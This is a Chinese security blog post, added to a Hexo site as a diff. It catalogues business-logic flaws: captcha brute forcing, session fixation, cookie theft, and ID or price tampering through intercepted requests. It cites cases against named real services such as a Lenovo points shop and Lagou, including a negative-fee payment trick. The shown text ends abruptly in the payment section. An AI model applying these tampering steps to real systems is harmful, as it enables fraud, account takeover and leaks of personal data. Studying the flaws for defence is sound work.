@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="业务逻辑漏洞收集1.验证码回传在没有验证次数限制或者一次验证码可以多次使用的地方,可以使用已知用户名对密码进行爆破,也可以使用通用密码对用户名进行爆破。然后通过数据包判断是否成功。利用工具BURP。 如下：  忘记密码界面未对验证码验证次数进行限制，导致可以无限制进行验证码验证。并进行密码更改。同时若注册界面也没有进行验证码次数验证，也可导致短信爆破。  2.Cookie&amp;amp;session2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="业务逻辑漏洞收集">
+<meta property="og:url" content="http://yoursite.com/2020/04/20/业务逻辑漏洞收集/index.html">
+<meta property="og:site_name" content="Darren-学无止境">
+<meta property="og:description" content="业务逻辑漏洞收集1.验证码回传在没有验证次数限制或者一次验证码可以多次使用的地方,可以使用已知用户名对密码进行爆破,也可以使用通用密码对用户名进行爆破。然后通过数据包判断是否成功。利用工具BURP。 如下：  忘记密码界面未对验证码验证次数进行限制，导致可以无限制进行验证码验证。并进行密码更改。同时若注册界面也没有进行验证码次数验证，也可导致短信爆破。  2.Cookie&amp;amp;session2">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200409153449781.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200409153413977.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165800245.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165818667.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165841786.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172051793.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172342542.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172402542.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172431636.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173058031.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173125334.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173139978.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173150867.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173201425.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173221415.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173235849.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174330391.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174358620.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174443125.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174607063.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174822914.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174833783.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174930933.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175009638.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175023388.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175042189.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416175050116.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181205291.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181236739.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181303342.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413181326212.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105247904.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105310762.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200414105326037.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162321809.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162551249.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162603403.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162619418.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416162631794.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416163918060.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416164136056.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165224970.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165242529.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165312834.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416165345951.png">
+<meta property="og:updated_time" content="2020-05-11T07:33:59.831Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="业务逻辑漏洞收集">
+<meta name="twitter:description" content="业务逻辑漏洞收集1.验证码回传在没有验证次数限制或者一次验证码可以多次使用的地方,可以使用已知用户名对密码进行爆破,也可以使用通用密码对用户名进行爆破。然后通过数据包判断是否成功。利用工具BURP。 如下：  忘记密码界面未对验证码验证次数进行限制，导致可以无限制进行验证码验证。并进行密码更改。同时若注册界面也没有进行验证码次数验证，也可导致短信爆破。  2.Cookie&amp;amp;session2">
+<meta name="twitter:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200409153449781.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/20/业务逻辑漏洞收集/">
+
+
+
+
+
+  <title>业务逻辑漏洞收集 | Darren-学无止境</title>
+  
+
+
+
+
+
+
+
+
+
+  <script>
+class Circle {
+    //创建对象
+    //以一个圆为对象
+    //设置随机的 x，y坐标，r半径，_mx，_my移动的距离
+    //this.r是创建圆的半径，参数越大半径越大
+    //this._mx,this._my是移动的距离，参数越大移动
+    constructor(x, y) {
+        this.x = x;
+        this.y = y;
+        this.r = Math.random() * 10 ;
+        this._mx = Math.random() ;
+        this._my = Math.random() ;
+
+    }
+
+    //canvas 画圆和画直线
+    //画圆就是正常的用canvas画一个圆
+    //画直线是两个圆连线，为了避免直线过多，给圆圈距离设置了一个值，距离很远的圆圈，就不做连线处理
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //arc() 方法使用一个中心点和半径，为一个画布的当前子路径添加一条弧。
+        ctx.arc(this.x, this.y, this.r, 0, 360)
+        ctx.closePath();
+        ctx.fillStyle = 'rgba(204, 204, 204, 0.3)';
+        ctx.fill();
+    }
+
+    drawLine(ctx, _circle) {
+        let dx = this.x - _circle.x;
+        let dy = this.y - _circle.y;
+        let d = Math.sqrt(dx * dx + dy * dy)
+        if (d < 150) {
+            ctx.beginPath();
+            //开始一条路径，移动到位置 this.x,this.y。创建到达位置 _circle.x,_circle.y 的一条线：
+            ctx.moveTo(this.x, this.y);   //起始点
+            ctx.lineTo(_circle.x, _circle.y);   //终点
+            ctx.closePath();
+            ctx.strokeStyle = 'rgba(204, 204, 204, 0.3)';
+            ctx.stroke();
+        }
+    }
+
+    // 圆圈移动
+    // 圆圈移动的距离必须在屏幕范围内
+    move(w, h) {
+        this._mx = (this.x < w && this.x > 0) ? this._mx : (-this._mx);
+        this._my = (this.y < h && this.y > 0) ? this._my : (-this._my);
+        this.x += this._mx / 2;
+        this.y += this._my / 2;
+    }
+}
+//鼠标点画圆闪烁变动
+class currentCirle extends Circle {
+    constructor(x, y) {
+        super(x, y)
+    }
+
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //注释内容为鼠标焦点的地方圆圈半径变化
+        //this.r = (this.r < 14 && this.r > 1) ? this.r + (Math.random() * 2 - 1) : 2;
+        this.r = 8;
+        ctx.arc(this.x, this.y, this.r, 0, 360);
+        ctx.closePath();
+        //ctx.fillStyle = 'rgba(0,0,0,' + (parseInt(Math.random() * 100) / 100) + ')'
+        ctx.fillStyle = 'rgba(255, 77, 54, 0.3)'
+        ctx.fill();
+
+    }
+}
+//更新页面用requestAnimationFrame替代setTimeout
+window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+let w = canvas.width = canvas.offsetWidth;
+let h = canvas.height = canvas.offsetHeight;
+let circles = [];
+let current_circle = new currentCirle(0, 0)
+
+let draw = function () {
+    ctx.clearRect(0, 0, w, h);
+    for (let i = 0; i < circles.length; i++) {
+        circles[i].move(w, h);
+        circles[i].drawCircle(ctx);
+        for (j = i + 1; j < circles.length; j++) {
+            circles[i].drawLine(ctx, circles[j])
+        }
+    }
+    if (current_circle.x) {
+        current_circle.drawCircle(ctx);
+        for (var k = 1; k < circles.length; k++) {
+            current_circle.drawLine(ctx, circles[k])
+        }
+    }
+    requestAnimationFrame(draw)
+}
+
+let init = function (num) {
+    for (var i = 0; i < num; i++) {
+        circles.push(new Circle(Math.random() * w, Math.random() * h));
+    }
+    draw();
+}
+window.addEventListener('load', init(60));
+window.onmousemove = function (e) {
+    e = e || window.event;
+    current_circle.x = e.clientX;
+    current_circle.y = e.clientY;
+}
+window.onmouseout = function () {
+    current_circle.x = null;
+    current_circle.y = null;
+
+};
+</script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/Darren-zl"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Darren-学无止境</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
+            
+            留言板
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-photo">
+          <a href="/photo/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
+            
+            摄影
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br>
+            
+            音乐
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-welfare">
+          <a href="/welfare/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-leaf"></i> <br>
+            
+            福利
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            书单
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/20/业务逻辑漏洞收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">业务逻辑漏洞收集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-20T13:55:34+08:00">
+                2020-04-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/04/20/业务逻辑漏洞收集/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2020/04/20/业务逻辑漏洞收集/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/04/20/业务逻辑漏洞收集/" class="leancloud_visitors" data-flag-title="业务逻辑漏洞收集">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        <h2 id="业务逻辑漏洞收集"><a href="#业务逻辑漏洞收集" class="headerlink" title="业务逻辑漏洞收集"></a>业务逻辑漏洞收集</h2><h3 id="1-验证码回传"><a href="#1-验证码回传" class="headerlink" title="1.验证码回传"></a>1.验证码回传</h3><p>在没有验证次数限制或者一次验证码可以多次使用的地方,可以使用已知用户名对密码进行爆破,也可以使用通用密码对用户名进行爆破。然后通过数据包判断是否成功。利用工具BURP。</p>
+<p>如下：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200409153449781.png" alt="image-20200409153449781"></p>
+<p>忘记密码界面未对验证码验证次数进行限制，导致可以无限制进行验证码验证。并进行密码更改。同时若注册界面也没有进行验证码次数验证，也可导致短信爆破。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200409153413977.png" alt="image-20200409153413977"></p>
+<h3 id="2-Cookie-amp-session"><a href="#2-Cookie-amp-session" class="headerlink" title="2.Cookie&amp;session"></a>2.Cookie&amp;session</h3><h4 id="2-1-会话固定攻击"><a href="#2-1-会话固定攻击" class="headerlink" title="2.1 会话固定攻击"></a>2.1 会话固定攻击</h4><p>Session fixation attack(会话固定攻击)是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人。<br>session固定漏洞最为核心的其实应该是程序使用session作为认证方式，但又放开了session_id的设置，并且设置session_id在session_starts()执行之后，session_id以key/value的形式指定了后端使用哪个session。<br>1.Attacker先打开一个网站<a href="http://www.baidu.com，然后服务器会回复他一个session" target="_blank" rel="noopener">http://www.baidu.com，然后服务器会回复他一个session</a> id。比如SID=abcdefg。Attacker把这个id记下了。<br>2.Attacker给UserA发送一个电子邮件，他假装是什么推销什么，诱导UserA点击链接<a href="http://unsafe/?SID=abcdefg，SID后面是Attacker自己的session" target="_blank" rel="noopener">http://unsafe/?SID=abcdefg，SID后面是Attacker自己的session</a> id。<br>3.UserA被吸引了，点击了<a href="http://unsafe/?SID=abcdefg，像往常一样，输入了自己的帐号和口令从而登录到银行网站。" target="_blank" rel="noopener">http://unsafe/?SID=abcdefg，像往常一样，输入了自己的帐号和口令从而登录到银行网站。</a><br>4.因为服务器的session id不改变，现在Attacker点击<a href="http://unsafe/?SID=abcdefg后，他就拥有了Alice的身份。可以为所欲为了。" target="_blank" rel="noopener">http://unsafe/?SID=abcdefg后，他就拥有了Alice的身份。可以为所欲为了。</a></p>
+<h6 id="获取sessionID方式："><a href="#获取sessionID方式：" class="headerlink" title="获取sessionID方式："></a>获取sessionID方式：</h6><p>1.暴力破解：尝试各种Session ID，直到破解为止；<br>2.预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；<br>3.窃取：使用网络嗅探，XSS攻击等方法获得。<br>      对于PHP来说，其内部Session的实现机制虽然不是很安全，但是关于生成Session ID的环节还是比较安全的，这个随机的Session ID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。<br>      对于第三种方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。<br>在应用层上也可以做出相应的防御措施：<br>      目前有三种广泛使用的在Web环境中维护会话（传递Session ID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。</p>
+<h4 id="2-2-基于cookie的攻击与防御"><a href="#2-2-基于cookie的攻击与防御" class="headerlink" title="2.2 基于cookie的攻击与防御"></a>2.2 基于cookie的攻击与防御</h4><h6 id="cookie的攻击方式："><a href="#cookie的攻击方式：" class="headerlink" title="cookie的攻击方式："></a>cookie的攻击方式：</h6><p>1.直接访问cookie文件查找想要的机密信息。</p>
+<p>2.在客户端和服务端进行cookie信息传递的时候，进行冒充合法的用户进行操作。</p>
+<p>3.攻击者修改cookie信息，所以在服务端接收到客户端获取的cookie信息的时候，就会对攻击者伪造的cookie信息进行操作。</p>
+<h6 id="获取cookie信息的主要途径："><a href="#获取cookie信息的主要途径：" class="headerlink" title="获取cookie信息的主要途径："></a>获取cookie信息的主要途径：</h6><p>1.直接读取磁盘的Cookie文件，Windows系统的Cookie信息存放目录是C:/Documents and Settings/%yourname%/Cookies,FireFox的Cookie信息是在FireFox的Profiles目录中。</p>
+<p>2.使用网络嗅探器来获取网络上传输的Cookie</p>
+<p>3.使用一些Cookie管理工具获取内存或者文件系统中的cookie</p>
+<p>4.使用跨站脚本来盗取别人的cookie,见blog </p>
+<h6 id="什么样的cookie可以被利用："><a href="#什么样的cookie可以被利用：" class="headerlink" title="什么样的cookie可以被利用："></a>什么样的cookie可以被利用：</h6><p>1.Cookie中包含了不应该让除开发者之外的其他人看到的其他信息，如USERID=1000，USERSTATUS=ONLINE，ACCOUNT_ID=xxx等等这些信息。</p>
+<h3 id="3-业务安全一致性"><a href="#3-业务安全一致性" class="headerlink" title="3.业务安全一致性"></a>3.业务安全一致性</h3><h4 id="3-1-邮箱用户名修改"><a href="#3-1-邮箱用户名修改" class="headerlink" title="3.1 邮箱用户名修改"></a>3.1 邮箱用户名修改</h4><p>抓包修改用户名或者邮箱参数为其他用户邮箱获取其权限或相关信息。</p>
+<p>案例1 绿盟RSAS安全系统全版本通杀权限管理员绕过漏洞：</p>
+<p>1.首先以普通用户登录。</p>
+<p>2.然后抓包，将referer处的普通用户post的数据里面的ID一律修改为admin，也就是管理员账号，2处修改完后的数据包如下图：<img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165800245.png" alt="image-20200413165800245"></p>
+<p>提交数据后，直接返回给我们超级管理员的密码修改页面，利用逻辑错误直接得到超级权限，如图：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165818667.png" alt="image-20200413165818667"></p>
+<p>然后直接在这里修改admin的密码，然后提交即可：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413165841786.png" alt="image-20200413165841786"></p>
+<h4 id="3-2-订单ID修改"><a href="#3-2-订单ID修改" class="headerlink" title="3.2 订单ID修改"></a>3.2 订单ID修改</h4><p>查看自己的订单id，然后修改id（加减一）查看是否能查看其它订单信息。</p>
+<p>案例：广之旅旅行社任意访问用户订单</p>
+<p><a href="http://www.gzl.com.cn/" target="_blank" rel="noopener">http://www.gzl.com.cn/</a></p>
+<p>只要随便假订一张订单，在我的订单里面获得订单号，就能穷举其它订单信息</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172051793.png" alt="image-20200413172051793"></p>
+<p><a href="http://www.gzl.com.cn/Users/Order/Groups.aspx?OrderId=订单号" target="_blank" rel="noopener">http://www.gzl.com.cn/Users/Order/Groups.aspx?OrderId=订单号</a></p>
+<h4 id="3-3-商品编号修改"><a href="#3-3-商品编号修改" class="headerlink" title="3.3 商品编号修改"></a>3.3 商品编号修改</h4><p>例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换区高积分商品。</p>
+<p>案例:联想某积分商城支付漏洞再绕过</p>
+<p><a href="http://ideaclub.lenovo.com.cn/club/index.php?m=goods&amp;c=lists" target="_blank" rel="noopener">http://ideaclub.lenovo.com.cn/club/index.php?m=goods&amp;c=lists</a></p>
+<p>1.先挑出喜欢的礼物，复制goods_id=1419f75d406811e3ae7601beb44c5ff7商品编号。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172342542.png" alt="image-20200413172342542"></p>
+<p>2.选择积分最低的礼物兑换（5积分的杯子），并填好相关信息，抓包修改goods_id替换为1419f75d406811e3ae7601beb44c5ff7</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172402542.png" alt="image-20200413172402542"></p>
+<p>3.这里显示兑换成功，虽然显示的是被子兑换成功，但是兑换记录里，就不相同了。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413172431636.png" alt="image-20200413172431636"></p>
+<p>这样就用5积分换了30积分的礼物。</p>
+<h4 id="3-4-用户ID篡改"><a href="#3-4-用户ID篡改" class="headerlink" title="3.4 用户ID篡改"></a>3.4 用户ID篡改</h4><p>抓包查看自己的用户id，然后修改id（加减1）查看是否能查看其它用户id信息。</p>
+<p>案例：拉勾网百万简历泄露风险(包括手机、邮件、应聘职位等信息、还可冒充企业身份筛选简历、发面试通知等)</p>
+<p>注册一个企业账户，发布一个职位，然后看到有２个人投了简历：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173058031.png" alt="image-20200413173058031"></p>
+<p>打开简历，点转发：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173125334.png" alt="image-20200413173125334"></p>
+<p>抓包：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173139978.png" alt="image-20200413173139978"></p>
+<p>改简历id，话说这是get：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173150867.png" alt="image-20200413173150867"></p>
+<p>去邮箱看到有２封邮件：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173201425.png" alt="image-20200413173201425"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173221415.png" alt="image-20200413173221415"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200413173235849.png" alt="image-20200413173235849"></p>
+<h4 id="3-5-支付漏洞"><a href="#3-5-支付漏洞" class="headerlink" title="3.5 支付漏洞"></a>3.5 支付漏洞</h4><p>首先在购票网站可以看到。电影票价格是53，开启burp并点击购票，</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174330391.png" alt="image-20200416174330391"></p>
+<p>进行选座：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174358620.png" alt="image-20200416174358620"></p>
+<p>拦截包并修改serviceFee（服务费）字段：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174443125.png" alt="image-20200416174443125"></p>
+<p>改为-49.99，并把数据包放走：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174607063.png" alt="image-20200416174607063"></p>
+<p>然后可以看到支付订单为0.01元：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200416174822914.png" alt="image-20200416174822914"></p>
